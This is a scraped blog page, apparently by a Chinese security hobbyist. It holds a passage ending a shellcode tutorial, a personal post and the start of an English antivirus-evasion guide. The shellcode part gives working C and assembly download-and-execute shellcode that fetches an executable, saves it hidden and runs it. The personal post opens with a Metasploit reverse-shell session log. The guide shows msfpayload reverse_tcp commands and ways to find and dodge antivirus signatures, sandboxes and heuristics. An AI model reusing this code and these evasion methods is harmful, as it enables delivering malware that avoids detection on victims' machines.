class="built_in">printf</span>(<span class="string">"Allocate a resource handle\n"</span>);</span><br><span class="line">  HINTERNET reshandle;</span><br><span class="line">  <span class="keyword">char</span> url[] = <span class="string">"http://localhost:4000/calc.exe"</span>;</span><br><span class="line">  reshandle = InternetOpenUrl(nethandle, url, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (reshandle == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Error on InternetOpenUrl\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create the local executable file</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Create the local executable file\n"</span>);</span><br><span class="line">  HANDLE filehandle;</span><br><span class="line">  <span class="keyword">char</span> filename[] = <span class="string">"something.exe"</span>;</span><br><span class="line">  filehandle = CreateFile(filename, GENERIC_ALL, <span class="number">0</span>, <span class="literal">NULL</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL|FILE_ATTRIBUTE_HIDDEN, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (filehandle == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Error on CreateFile\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// Download the executable</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"download the executable\n"</span>);</span><br><span class="line">  DWORD NumberOfBytesRead=<span class="number">0</span>;</span><br><span class="line">  DWORD NumberOfBytesWritten=<span class="number">0</span>;</span><br><span class="line">  BOOL nret;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>==<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">void</span> *Buffer = <span class="built_in">malloc</span>(<span class="number">260</span>);</span><br><span class="line">    nret = InternetReadFile(reshandle, Buffer, <span class="number">260</span>, &amp;NumberOfBytesRead);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"InternetReadFile\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"read %d bytes\n"</span>, (<span class="keyword">int</span>)NumberOfBytesRead);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, (<span class="keyword">char</span> *)Buffer);</span><br><span class="line">    <span class="keyword">if</span> (NumberOfBytesRead == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"WriteFile\n"</span>);</span><br><span class="line">    nret = WriteFile(filehandle, Buffer, NumberOfBytesRead, &amp;NumberOfBytesWritten, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"write %d bytes\n"</span>, (<span class="keyword">int</span>)NumberOfBytesWritten);</span><br><span class="line">    <span class="keyword">if</span> (nret == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Error on Writefile\n"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(Buffer);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Close handle\n"</span>);</span><br><span class="line">  CloseHandle(filehandle);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create Process</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Create Process\n"</span>);</span><br><span class="line">  STARTUPINFO startupinfo;</span><br><span class="line">  <span class="comment">// printf("size of STARTUPINFO is %d\n", sizeof(startupinfo));</span></span><br><span class="line">  PROCESS_INFORMATION processinformation;</span><br><span class="line">  <span class="comment">// printf("size of PROCESS_INFORMATION is %d\n", sizeof(processinformation));</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;startupinfo, <span class="string">'\0'</span>, <span class="keyword">sizeof</span>(STARTUPINFO));</span><br><span class="line">  <span class="built_in">memset</span>(&amp;processinformation, <span class="string">'\0'</span>, <span class="keyword">sizeof</span>(PROCESS_INFORMATION));</span><br><span class="line">  startupinfo.cb = <span class="number">0x44</span>;</span><br><span class="line">  CreateProcess(<span class="literal">NULL</span>, filename, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;startupinfo, &amp;processinformation);</span><br><span class="line"></span><br><span class="line">  ExitProcess(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>asm：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; port_bind.asm&#10;BITS 32&#10;[SECTION .text]&#10;global _start&#10;_start:&#10;    jmp start_asm&#10;&#10;;DEFINE FUNCTIONS&#10;&#10;    find_kernel32:&#10;        push esi&#10;&#9;xor eax, eax&#10;&#9;mov eax, [fs:eax+0x30] &#9;;PEB&#10;&#9;mov eax, [eax + 0x0c]&#9;;PEB-&#62;LoaderData&#10;&#9;mov esi, [eax + 0x1c]&#9;;PEB-&#62;LoaderData-&#62;InInitializationOrderModuleList&#10;&#9;lodsd&#9;&#9;&#9;;next entry the double linked list point to&#10;&#9;mov eax, [eax + 0x8]&#9;;imagebase of kernel32&#10;&#9;pop esi&#10;&#9;ret&#10;&#10;&#9;;END FUNCTION: find_kernel32&#10;&#10;&#9;; FUNCTION: find_function&#10;    find_function:&#9;&#9;; find_functions(edx, eax)&#10;        pushad&#10;&#9;mov ebp, [esp+0x24]&#9;;edx(dll)&#10;&#9;mov eax, [ebp+0x3c]&#9;;Skip MS DOS header to PE header&#10;&#9;mov edx, [ebp+eax+0x78]&#9;;Export table is 0x78 byts from the start of the PE header&#10;&#9;add edx, ebp&#9;&#9;;Absolute address&#10;&#9;mov ecx, [edx+0x18]&#9;;Number of functions&#10;&#9;mov ebx, [edx+0x20]&#9;; address of names(rva) table relative offset&#10;&#9;add ebx, ebp&#9;&#9;; make the name talbe address absolute&#10;    find_function_loop:&#10;&#9;jecxz find_function_finished&#10;&#9;dec ecx&#10;&#9;mov esi, [ebx+ecx*4]&#10;&#9;add esi, ebp&#10;    compute_hash:&#10;        xor edi, edi&#10;&#9;xor eax, eax&#10;&#9;cld&#10;    compute_hash_again:&#10;        lodsb&#10;&#9;test al, al&#10;&#9;jz compute_hash_finished&#10;&#9;ror edi, 0xd&#10;&#9;add edi, eax&#10;&#9;jmp compute_hash_again&#10;    compute_hash_finished:&#10;    find_funtion_compare:&#10;        cmp edi, [esp+0x28]&#10;&#9;jnz find_function_loop&#10;&#9;mov ebx, [edx+0x24]&#9;; Exetract ordinals table relative offset and store it in ebx&#10;&#9;add ebx, ebp&#10;&#9;mov cx, [ebx + 2*ecx]&#9;; Extract the current symbos ordinal number from the ordinal table; Ordinals are 2 bytes in size&#10;&#9;mov ebx, [edx+0x1c]&#9;;Extract the address table relative offset and store it in ebx&#10;&#9;add ebx, ebp&#9;&#9;; make the address table address absolute&#10;&#9;mov eax, [ebx + 4*ecx]&#9;; extract the realtve function offset from its ordinal and store it in eax&#10;&#9;add eax, ebp&#10;&#9;mov [esp+0x1c], eax&#9;; overwrite eax&#10;    find_function_finished:&#10;&#9;popad&#10;&#9;ret&#10;&#10;&#9;; END FUNCTION: find_function&#10;&#9;; FUNCTION: resolve_symbols_for_dll&#10;    resolve_symbols_for_dll:&#10;&#9;; about to load current hash into eax(pointed by esi)&#10;&#9;lodsd&#10;&#9;push eax&#10;&#9;push edx&#10;&#9;call find_function&#10;&#9;mov [edi], eax&#10;&#9;add esp, 0x08&#10;&#9;add edi, 0x04&#10;&#9;cmp esi, ecx&#10;&#9;jne resolve_symbols_for_dll&#10;    resolve_symbols_for_dll_finished:&#10;        ret&#10;&#10;&#9;; END FUNCTION: resolve_symbols_for_dll&#10;&#10;;END FUNCTIONS&#10;&#10;    locate_kernel32_hashes:&#10;        call locate_kernel32_hashes_return&#10;&#9;; BIG ENDIAN&#10;&#9;; LoadLibraryA---ebp&#10;&#9;db 0x8e, 0x4e, 0x0e, 0xec&#10;&#9;; CreateFile---ebp+4&#10;&#9;db 0xa5, 0x17, 0x0, 0x7c&#10;&#9;; WriteFile---ebp+0x8&#10;        db 0x1f, 0x79, 0xa, 0xe8&#10;        ; CloseHandle---ebp+0xc&#10;        db 0xfb, 0x97, 0xfd, 0xf&#10;&#9;; CreateProcessA---ebp+0x10&#10;&#9;db 0x72, 0xfe, 0xb3, 0x16&#10;&#9;; ExitProcess---ebp+0x14&#10;&#9;db 0x7e, 0xd8, 0xe2, 0x73&#10;    ; Wininet.dll function hashes&#10;        ; InternetOpenA---ebp+0x18&#10;        db 0x29, 0x44, 0xe8, 0x57&#10;&#9;; InternetOpenUrlA---ebp+0x1c&#10;        db 0x49, 0xed, 0xf, 0x7e&#10;        ; InternetReadFile---ebp+0x20&#10;        db 0x8b, 0x4b, 0xe3, 0x5f&#10;&#10;    ; DEFINE Constants END&#10;        &#10;    start_asm:&#10;        sub esp, 0x88&#10;&#9;mov ebp, esp&#10;&#9;call find_kernel32&#10;&#9;mov edx, eax&#10;&#9;; resolve kernel32 symbols&#10;&#9;jmp short locate_kernel32_hashes&#10;    locate_kernel32_hashes_return:&#10;        pop esi&#10;&#9;lea edi, [ebp+0x00]&#10;&#9;mov ecx, esi&#10;&#9;add ecx, 0x18 &#9;; length of kernel32 list&#10;&#9;call resolve_symbols_for_dll&#10;&#10;&#9;; resolve wininet symbols&#10;&#9;add ecx, 0xc&#10;&#9;; xor eax, eax&#10;&#9;mov eax, 0x74656e01&#10;&#9;sar eax, 0x08&#10;&#9;push eax&#9;; net&#10;&#9;push 0x696e6977&#9;; wini&#10;&#9;mov ebx, esp&#10;&#9;push ecx&#9;; preserve ecx, LoadLibraryA &#30772;&#22351;ecx&#21644;edx?&#10;&#9;push edx&#9;; preserve edx&#10;&#9;push ebx&#10;&#9;call [ebp+0x0]&#10;&#9;pop edx&#10;&#9;pop ecx&#10;&#9;mov edx, eax&#9;; &#20043;&#21069;&#20445;&#25252;edx&#24178;&#20040;...?&#10;&#9;call resolve_symbols_for_dll&#10;    internet_open:&#10;        xor eax, eax&#10;&#9;push eax&#10;&#9;push eax&#10;&#9;push eax&#10;&#9;push eax&#10;&#9;push eax&#10;&#9;call [ebp+0x18]&#10;&#9;mov [ebp+0x24], eax ; nethandle&#10;    internet_open_url:&#10;        xor eax, eax&#10;&#9;mov ax, 0x6578&#10;&#9;push eax&#10;&#9;push 0x652e636c &#9;; calc.exe&#10;&#9;push 0x61632f30&#10;&#9;push 0x3030383a&#10;&#9;push 0x74736f68&#10;&#9;push 0x6c61636f&#10;&#9;push 0x6c2f2f3a&#10;&#9;push 0x70747468 ; http://localhost:8000/calc.exe&#10;&#9;mov ebx, esp&#10;&#9;xor eax, eax&#10;&#9;push eax&#10;&#9;push eax&#10;&#9;push eax&#10;&#9;push eax&#10;&#9;push ebx&#10;&#9;push dword [ebp+0x24]&#9;&#9;;nethandle&#10;&#9;call [ebp+0x1c]&#10;&#9;mov [ebp+0x28], eax&#9;; reshandle&#10;    &#10;    create_file:&#10;        xor eax, eax&#10;&#9;mov al, 0x65&#10;&#9;push eax&#10;&#9;push 0x78652e67&#10;&#9;push 0x6e696874&#10;&#9;push 0x656d6f73 &#9;; something.exe&#10;&#9;mov [ebp+0x2c], esp&#9;; filename-&#62;something&#10;&#9;xor eax, eax&#10;&#9;push eax&#10;&#9;mov al, 0x82&#9;&#9;; FILE_ATTRIBUTE_NORMAL|FILE_ATTRIBUTE_HIDDEN&#10;&#9;push eax&#10;&#9;mov al, 0x02&#10;&#9;push eax&#9;&#9;; CREATE_ALWAYS&#10;&#9;xor al, al&#10;&#9;push eax&#10;&#9;push eax&#10;&#9;mov al, 0x40&#10;&#9;sal eax, 0x18&#9;&#9;; GENERIC_ALL&#10;&#9;push eax&#10;&#9;push dword [ebp+0x2c]&#10;&#9;call [ebp+0x4]&#10;&#9;mov [ebp+0x30], eax&#9;; filehandle&#10;&#10;    download_begin:&#10;        xor eax, eax&#10;&#9;mov ax, 0x010c&#9;; esi-&#62;DWORD numberofbytesread + 260 buffer&#10;&#9;sub esp, eax&#10;&#9;mov esi, esp&#10;    download_loop:&#10;        push esi&#9;; &#10;&#9;mov ax, 0x0104&#10;&#9;push eax&#10;&#9;lea eax, [esi+4]&#10;&#9;push eax&#10;&#9;push dword [ebp+0x28]&#9;&#9;; reshandle&#10;&#9;call [ebp+0x20]&#10;&#9;mov eax, [esi]&#9;&#9;; NumbeOfBytesRead&#10;&#9;test eax, eax&#10;&#9;jz download_finished&#10;    download_write_file:&#10;        xor eax, eax&#10;&#9;push eax&#9;&#9;&#10;&#9;push esi&#10;&#9;push dword [esi]&#10;&#9;lea eax, [esi+0x04]&#10;&#9;push eax&#10;&#9;push dword [ebp+0x30]&#10;&#9;call [ebp+0x8]&#10;&#9;jmp download_loop&#10;    download_finished:&#10;        push dword [ebp+0x30]&#10;&#9;call [ebp+0xc]&#10;&#9;xor eax, eax&#10;&#9;mov ax, 0x0104 &#9;; restore stack&#10;&#9;; CreateProcess&#10;    initialize_process:&#10;&#9;add esp, eax&#10;&#9;xor ecx, ecx&#10;&#9;mov cl, 0x54&#10;&#9;sub esp, ecx&#10;&#9;mov edi, esp&#10;    zero_structs:&#10;        xor eax, eax&#10;&#9;rep stosb&#10;    initialize_structs:&#10;        mov edi, esp&#10;&#9;mov byte [edi], 0x44&#9;; !!!!!cb&#10;    execute_process:&#10;        lea esi, [edi+0x44]&#9;&#9;; esi-&#62;process_information&#10;&#9;push esi&#10;&#9;push edi&#10;&#9;push eax&#10;&#9;push eax&#10;&#9;push eax&#10;&#9;push eax&#10;&#9;push eax&#10;&#9;push eax&#10;&#9;push dword [ebp+0x2c]&#9;&#9;; -&#62;&#34;something&#34;&#10;&#9;push eax&#10;&#9;call [ebp+0x10]&#10;    exit_process:&#10;        call [ebp+0x14]</span><br></pre></td></tr></table></figure>
<h3 id="分阶段shellcode">分阶段shellcode</h3><p>第一阶段建立连接，并读取shellcode，然后指向执行。</p>
<p>待续。。。</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/life/2013/08/21/new-travel/" itemprop="url">
                  新的旅途？
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2013-08-21T00:00:00+08:00" content="2013-08-21">
              2013-08-21
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/life/" itemprop="url" rel="index">
                    <span itemprop="name">life</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/life/2013/08/21/new-travel/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2013/08/21/new-travel/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <pre><code>~/Work/project/shellcode ⮀ ~/metasploit-framework/msfconsole

 ______     _     _     _____     _________  
|<span class="string">  ___ \   </span>|<span class="string"> </span>|<span class="string">   </span>|<span class="string"> </span>|<span class="string">   </span>|<span class="string">  __ \   </span>|<span class="string">____ ____</span>|<span class="string">  
</span>|<span class="string"> </span>|<span class="string">  </span>|<span class="string"> </span>|<span class="string">   </span>|<span class="string"> </span>|<span class="string">   </span>|<span class="string"> </span>|<span class="string">   </span>|<span class="string"> </span>|<span class="string">  </span>|<span class="string"> </span>|<span class="string">      </span>|<span class="string"> </span>|<span class="string">  
</span>|<span class="string"> </span>|<span class="string">__</span>|<span class="string"> </span>|<span class="string">   </span>|<span class="string"> </span>|<span class="string">   </span>|<span class="string"> </span>|<span class="string">   </span>|<span class="string"> </span>|<span class="string">__</span>|<span class="string"> </span>|<span class="string">      </span>|<span class="string"> </span>|
|<span class="string">  __  </span>|<span class="string">   </span>|<span class="string"> </span>|<span class="string">   </span>|<span class="string"> </span>|<span class="string">   </span>|<span class="string">  ___/       </span>|<span class="string"> </span>|
|<span class="string"> </span>|<span class="string">  </span>|<span class="string"> </span>|<span class="string">   </span>|<span class="string"> </span>|<span class="string">   </span>|<span class="string"> </span>|<span class="string">   </span>|<span class="string"> </span>|<span class="string">           </span>|<span class="string"> </span>|
|<span class="string"> </span>|<span class="string">__</span>|<span class="string"> </span>|<span class="string">   </span>|<span class="string"> </span>|<span class="string">___</span>|<span class="string"> </span>|<span class="string">   </span>|<span class="string"> </span>|<span class="string">           </span>|<span class="string"> </span>|
|<span class="string">_____/    \______/    </span>|<span class="string">_</span>|<span class="string">           </span>|<span class="string">_</span>|


       =[ metasploit v4.7.0-dev [core:4.7 api:1.0]
+ -- --=[ 1131 exploits - 638 auxiliary - 180 post
+ -- --=[ 309 payloads - 30 encoders - 8 nops

msf &gt; use exploit/bupt/cleader/happy_hacking
msf exploit(happy_hacking) &gt; set PAYLOAD bupt/meterpreter/reverse_tcp
PAYLOAD =&gt; bupt/meterpreter/reverse_tcp
msf exploit(happy_hacking) &gt; set LHOST reverland.org
LHOST =&gt; reverland.org
msf exploit(happy_hacking) &gt; exploit

[<span class="keyword">*</span>] Started reverse handler on 127.0.0.1:4444 
[<span class="keyword">*</span>] Starting the payload handler...

[<span class="keyword">*</span>] Command shell session 1 opened (reverland.org:4444 -&gt; bupt.cleader:58229) at 2013-08-21 17:39:46 +0800

CMD Version 1.4.1

Z:\home\reverland\bupt\cleader\shellcode&gt;

...
</code></pre><p>总觉得有太多想做的事情还没有做，别的不说，有很多文章都想写却觉得没力气去写：</p>
<ol>
<li>写写毕业季，谈谈最后大学的日子，毕业阶段的总总可笑和可叹之处。</li>
<li>把相位去包裹中Goldstein枝切算法和最小二乘法的原理和代码到博客上写完，论文还在bitbucket上呢。最后还要写下有关技术和非技术的观点和总结。</li>
<li>windows下的shellcod书写，portbind和reverse tcp的，download and execute的，staged的、添加用户的,linux下bind 端口的，添加用户的，stage的。多态shellcode，编码加密压缩算法在shellcode编码上的应用和变化。</li>
<li>64位汇编和32位的区别和联系，函数调用、系统调用、寄存器等等。</li>
</ol>
<p>从上面看，大概是写shellcode写疯了，确切地说应该是学写shellcode学疯了。两年前对科学计算大概也是这样的热情吧，然而一个多月前Coursera上machine learning结课之后我却再也没回头看看，更别谈应用了。我虽知热情并非一阵风刮过，时光却总是有限，不让我回头拾起满溢一地的宝珠。</p>
<p>谁知道研究生阶段会做什么，也没问过，也不在乎，听传闻上属于挂羊头卖狗肉的行当，不过传闻总是很可怕的。如果可以，我以后也许想做做律师奸商销售老师公务员什么的。黑客的梦想，让她作为一个美好的爱好和梦随风而逝吧。</p>
<p>还有残念万千，也许会永远残念下去：</p>
<ol>
<li>Python科学计算出第二版了，几年时间变化真快。不知道还有机会看么。其实就这些日子的体验来看，到底还是先接触C和Fortran，Python用户太容易浪费资源了。可惜Coursera上的高性能科学计算没看完，大致讲了讲ipython环境和fortran的用法，以及并行计算等话题。</li>
<li>好好锻炼身体。不想因为天天坐在计算机前挂掉了，最近脖子不舒服。不是说我老在讲珍爱生命远离计算机。</li>
<li>迷上社交工程了，哪天把The art of deception看完，hack不只在技术上啊。</li>
<li>回头看看lisp</li>
<li>继续痴迷地玩shellcode，免不了开始了解更多有关操作系统和通信的东西，什么ELF和PE格式啊等等。接触一大堆各个平台的迥异的工具和理念。</li>
<li>看看前端，看看js，包括jquery/angularjs。</li>
<li>还是很喜欢gimp，前一阵试了试一个上色插件真是太酷了</li>
<li>马拉松么，似乎无影无踪了，但每天还是想自己去跑跑。北邮的操场离马路太近，北师的操场应该是个不错的选择。</li>
<li>得想想怎么锻炼腰部，自从大一打篮球伤着之后一直都不舒服，久坐之后尤其。做俯卧撑时基本上都不是上肢和胸部受不了而是腰实在……</li>
</ol>
<p>有盼头总是好的，探索和前进的愿望总是可贵的，生活斑斓多彩，有趣的东西一定不在某一个领域。</p>
<p>好奇之心就是黑客精神，前行之路即为人生。</p>
<p>祝大家安好，在人生的道路上凭借信心、智慧和勇气，Happy Hacking！</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/exploit/2013/08/13/notes-on-anti-virus-evasion/" itemprop="url">
                  Notes on Anti-virus Evasion
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2013-08-13T00:00:00+08:00" content="2013-08-13">
              2013-08-13
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/exploit/" itemprop="url" rel="index">
                    <span itemprop="name">exploit</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/exploit/2013/08/13/notes-on-anti-virus-evasion/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="exploit/2013/08/13/notes-on-anti-virus-evasion/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>Ok, This article is about why and how can you bypass antivirus softwares when you are using metasploit payloads. First of all, I’d like to emphasize the following things:</p>
<ol>
<li>Don’t be stupid. Do anything at your own risk.</li>
<li>There is nothing too hard to learn. If you find something really hard to understand. <a href="http://www.offensive-security.com/when-things-get-tough/" target="_blank" rel="external">Try harder</a>, you may lack of some necessary requirements, please refer to References section yourself. </li>
<li>There are lots of Unix tools to use for linux, so I use gentoo linux as my experiment environment. You can use anything you like.</li>
<li>I’m not a native English speaker, but I hope this article is interesting and useful to many non-Chinese speakers. So I write every word in a language I’m not familiar. The article may full with grammer mistakes, but you can understand what I’m saying is enough. Happy hacking.</li>
<li>Last but not least, Never upload your samples to a online scanner website like virustotal or so if you are a penetration tester and want to use your payload later. Check it on your local machine. you can alse try <a href="http://vscan.novirusthanks.org/" target="_blank" rel="external">novirusthanks</a> with <code>Do not distribute the sample</code> marked.</li>
</ol>
<h2 id="Theory:_How_Antivirus_software_works">Theory: How Antivirus software works</h2><h3 id="Signature-based_Detection">Signature-based Detection</h3><p>Why can you bypass AV detection? There won’t much way for AV vendors to decide whether a software is a normal program or a malware. They have 3 main ways, the most popular method it use to scan malwares is based on signature. AV engines scan the whole program to find something in accordance with the kown ‘bad strings’ in malwares. Once ‘bad strings’ being found, the program will be flagged as a malware.</p>
<p>You will soon see it is so. Lets take <a href="http://www.avast.com/" target="_blank" rel="external">Avast!</a> free edition as example. I do all my test on my linux machine, but you can do anything as you like.</p>
<p>First, Let’s use a <code>windows/meterpreter/reverse_tcp</code> payload from <a href="http://metasploit.com/" target="_blank" rel="external">Metasploit</a>. It will provide a reverse meterpreter shell to a remote computer for the hackers.</p>
<pre><code>~/metasploit-framework/msfpayload windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.56</span><span class="number">.102</span> X &gt; payload.exe
</code></pre><p>Start a listenner and assert it really works</p>
<pre><code><span class="tag">wine</span> <span class="tag">payload</span><span class="class">.exe</span>
</code></pre><p>However, Avast! will find its a malware! Moreover, even when you open the file explorer, the payload will be found before any scan.</p>
<p>To my surprise, Avast! will flag the binary files(Non-execute files) as malwares too. So it look like it use some ‘signature’ to judge whether a program is malicious or not. But, what’s the signature?</p>
<p>To find out the ‘bad string’, I use the old bisection method to locate where the signature really is:</p>
<pre><code>~/metasploit-framework/msfpayload windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.56</span><span class="number">.102</span> R &gt; payload_raw
cat payload_raw | cut -c614-<span class="number">663</span> &gt; malicious.txt
</code></pre><p>Ok, then I get the ‘bad string’ into <code>malicious.txt</code>. Scan it with Avast!, Avast! flag it as malware. You can download it <a href="https://github.com/reverland/scripts/blob/master/else/malicious.txt" target="_blank" rel="external">here</a> and test it with your own avast.</p>
<p>Now we are sure AV softwares use signature to find malwares. It is true, whenever a new suspicious files uploaded to AV vendors(for example, upload it to <a href="https://www.virustotal.com/" target="_blank" rel="external">Virustotal</a>), the new malware’s signature will be soon added to the virus signature database soon.</p>
<p>But thats not all.</p>
<p>There are other thing AV vendors use to detect malware. For metasploit is too famous in penetration testers’ group and other groups, AV softwares begin to detect whether the software is created with it. As a result, even if its not a malware, much AV will still flag your metasploit-created program as malware. You may check the <a href="http://www.intelligentexploit.com/articles/Metasploit:-Low-Level-View.pdf" target="_blank" rel="external">Metasploit: Low Level View</a> to learn more.</p>
<p>Seeing is believing. Let’s use metasploit framework to generate a program with no payload[^1]:</p>
<pre><code><span class="keyword">echo</span> -ne | ~/metasploit-framework/msfencode -<span class="keyword">e</span> generic/none -<span class="keyword">k</span> -<span class="keyword">x</span> calc.<span class="keyword">exe</span> -<span class="keyword">t</span> <span class="keyword">exe</span> -<span class="keyword">o</span> calc_no_payload.<span class="keyword">exe</span>
</code></pre><p>However, Avast! mark it as a threat <code>Win32 Rozpatch</code>, most AVs will detect it as malwares or simply virus as well, you can upload it to <a href="http://metascan-online.com/" target="_blank" rel="external">metascan</a> to check it.</p>
<p>What does that mean? You should use another way to generate programs if you won’t like your program to be detected.</p>
<p>In a word, Metasploit project are so well-known that nearly all it’s encoders and ways to generate programs are well researched. The encoder stub are simply to detect, the strange entrypoint to a rwx section are simply to detect. Much AVs are just detect these things rather than the real ‘bad signature’. Then we know we must use our own way to generate programs.</p>
<h3 id="Sandbox">Sandbox</h3><p>However, sandbox becomes more and more popular. Whenever a suspicious program runs, it will be comfined to a virtual sandbox environment. If they do something that can be flagged as malicious, the program will soon be marked as malware. Some AV will scan suspicious programs in this way. However, sandbox will take up too much system resources, it will only run it in sandbox for only little time than release it.</p>
<p>So malware authors begin to sleep or do some useless loops to pass the sandbox time. However, some AVs begin to flag program has the strange sleep and loops as malwares as a countermeasure.</p>
<p>The next example is to demonstrate this:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="comment">/* test for malwares */</span></span><br><span class="line"><span class="keyword">char</span> code[] = </span><br><span class="line"><span class="string">""</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i,j;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">100</span>;j++)</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"wait..."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>Then compile and link it.</p>
<pre><code>✘ ⮀ ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/bypassav ⮀ wine ~/</span>.wine<span class="regexp">/drive_c/</span>lcc<span class="regexp">/bin/</span>lcc test.c -o test.o
✘ ⮀ ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/bypassav ⮀ wine ~/</span>.wine<span class="regexp">/drive_c/</span>lcc<span class="regexp">/bin/</span>lcclnk.exe test.o -o test.exe
</code></pre><p>Then I upload it to metascan, 3 AVs mark it as malware though its nothing. The report is <a href="https://www.metascan-online.com/en/scanresult/file/bb96f4ab4ed74ae1b8766a6762b42470" target="_blank" rel="external">here</a></p>
<p>So you may have to use other ways to avoid these avs. Fortunately, there are tons of method to do this.(May not fortunate : ( )</p>
<h3 id="Heuristic">Heuristic</h3><p>When I try to bypass Kaspersky, It will always mark my deliberate payload with its heuristic engine. It’s really frustrating. You don’t know how heuristic works. At first I guess its something check special things like for-loop talked above in programs. So I remove my shellcode. It passed Kaspersky. I add my shellcode but not run it, it passed too. Then I noticed Kaspersky takes more time than other AVs to scan a sample. So I guess it may use a sandbox to check programs. However, when I use some sleep/for-loop tricks kaspersky will still mark my malware out. I check whether kaspersky will mark the sleep/for-loop section as malware, it didn’t.</p>
